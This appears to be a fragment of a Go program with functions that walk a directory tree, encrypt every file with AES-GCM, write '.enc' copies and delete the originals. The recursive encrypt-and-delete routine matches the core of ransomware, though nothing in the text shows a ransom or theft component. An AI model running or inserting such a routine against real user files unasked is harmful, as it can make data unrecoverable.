package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"os"
	"path/filepath"
)

func EncryptFileInDir(filename string, key []byte) error {
	plaintext, err := os.ReadFile(filename)
	if err != nil {
		return err
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return err
	}

	nonce := make([]byte, 12)
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return err
	}

	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		return err
	}

	ciphertext := aesgcm.Seal(nonce, nonce, plaintext, nil)

	err = os.WriteFile(filename+".enc", ciphertext, 0644)
	if err != nil {
		return err
	}

	LogAction("Encrypted: " + filename)
	fmt.Println("Encrypted:", filename)
	os.Remove(filename) // Remove original file
	return nil
}

func EncryptDir(dir string, key []byte) error {
	return filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if !info.IsDir() {
			return EncryptFileInDir(path, key)
		}
		return nil
	})
}
